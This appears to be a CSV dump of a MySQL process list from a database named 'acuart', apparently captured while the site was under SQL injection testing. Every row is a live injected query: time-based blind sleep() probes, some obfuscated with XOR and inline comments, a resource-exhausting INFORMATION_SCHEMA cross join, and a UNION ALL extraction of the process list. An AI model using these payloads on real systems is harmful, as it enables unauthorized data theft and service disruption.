ID,DB,INFO,STATE,HOST,TIME,USER,COMMAND
139536,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname FROM pictures a, artists b, categ c WHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND a.pic_id=(select*from(select(sleep(20)))a)",User sleep,localhost:45254,12,acuart,Query
140449,acuart,"SELECT * FROM users WHERE uname='X'XOR(if(now()=sysdate(),(sleep(6)),0))XOR'X' AND pass='J1DMDU0_3OO'",User sleep,localhost:49998,3,acuart,Query
76297,acuart,"SELECT * FROM artists WHERE artist_id=1 AND 7813=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)",checking permissions,localhost:34482,741,acuart,Query
73618,acuart,"SELECT * FROM artists WHERE artist_id=1 AND 7813=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)",checking permissions,localhost:49892,771,acuart,Query
139523,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname FROM pictures a, artists b, categ c WHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND a.a_id=(select*from(select(sleep(20)))a)",User sleep,localhost:45200,13,acuart,Query
140900,acuart,"SELECT * FROM artists WHERE artist_id=-1412 UNION ALL SELECT NULL,NULL,CONCAT(0x7171717671,JSON_ARRAYAGG(CONCAT_WS(0x766b736d707a,IFNULL(CAST(COMMAND AS CHAR),0x20),IFNULL(CAST(DB AS CHAR),0x20),IFNULL(CAST(ID AS CHAR),0x20),IFNULL(CAST(INFO AS CHAR),0x20),IFNULL(CAST(STATE AS CHAR),0x20),IFNULL(CAST(`HOST` AS CHAR),0x20),IFNULL(CAST(`TIME` AS CHAR),0x20),IFNULL(CAST(`USER` AS CHAR),0x20))),0x7171717171) FROM information_schema.`PROCESSLIST`-- -",executing,localhost:52142,0,acuart,Query
136381,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname\n\t\t\t\tFROM pictures a, artists b, categ c \n\t\t\t\tWHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND (LOCATE(''+/*!50000SLEEP*/(6)--+', a.title) > 0 OR LOCATE(''+/*!50000SLEEP*/(6)--+', a.pshort) > 0)",User sleep,localhost:59166,34,acuart,Query
140517,acuart,"SELECT * FROM users WHERE uname='0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z' AND pass='J1DMDU0_3OO'",User sleep,localhost:50362,2,acuart,Query
139966,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname\n\t\t\t\tFROM pictures a, artists b, categ c \n\t\t\t\tWHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND (LOCATE('X'XOR(if(now()=sysdate(),(sleep(9)),0))XOR'X', a.title) > 0 OR LOCATE('X'XOR(if(now()=sysdate(),(sleep(9)),0))XOR'X', a.pshort) > 0)",User sleep,localhost:47426,8,acuart,Query
140022,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname\n\t\t\t\tFROM pictures a, artists b, categ c \n\t\t\t\tWHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND (LOCATE('0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z', a.title) > 0 OR LOCATE('0'XOR(if(now()=sysdate(),sleep(9),0))XOR'Z', a.pshort) > 0)",User sleep,localhost:47718,7,acuart,Query
91254,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname FROM pictures a, artists b, categ c WHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND a.cat_id=4 or 0 in (select sleep(15) ) --",User sleep,localhost:58508,510,acuart,Query
140471,acuart,"SELECT * FROM users WHERE uname=''XOR(if(now()=sysdate(),sleep(6),0))XOR'' AND pass='J1DMDU0_3OO'",User sleep,localhost:50130,3,acuart,Query
140511,acuart,"SELECT * FROM users WHERE uname=''XOR/**/(if(now()=sysdate(),/*!*/sleep(/*X/X*/6),0))XOR'' AND pass='J1DMDU0_3OO'",User sleep,localhost:50330,2,acuart,Query
140847,acuart,"SELECT * FROM users WHERE uname=''OR(if(now()=sysdate(),sleep(6),0))OR'' AND pass='J1DMDU0_3OO'",User sleep,localhost:51906,0,acuart,Query
140079,acuart,"SELECT a.*, b.aname, b.artist_id, c.cname\n\t\t\t\tFROM pictures a, artists b, categ c \n\t\t\t\tWHERE a.cat_id=c.cat_id AND a.a_id=b.artist_id AND (LOCATE(''XOR/**/(if(now()=sysdate(),/*!*/sleep(/*X/X*/9),0))XOR'', a.title) > 0 OR LOCATE(''XOR/**/(if(now()=sysdate(),/*!*/sleep(/*X/X*/9),0))XOR'', a.pshort) > 0)",User sleep,localhost:48024,6,acuart,Query

